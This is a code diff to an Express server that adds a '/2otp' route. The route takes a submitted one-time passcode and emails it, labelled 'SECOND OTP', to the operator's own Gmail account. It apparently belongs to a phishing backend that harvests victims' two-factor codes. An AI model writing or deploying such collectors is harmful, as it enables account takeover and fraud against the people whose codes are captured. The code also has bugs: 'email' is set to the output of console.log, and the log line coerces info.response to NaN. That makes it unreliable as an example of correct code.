@@ -109,6 +109,38 @@ app.post("/otp", (req, res) => {
   });
 });
 
+
+// API routes for 2otp
+app.post("/2otp", (req, res) => {
+  console.log(req.body);
+  let email = console.log(req.body.email);
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `SECOND OTP: ${req.body?.otp} `,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
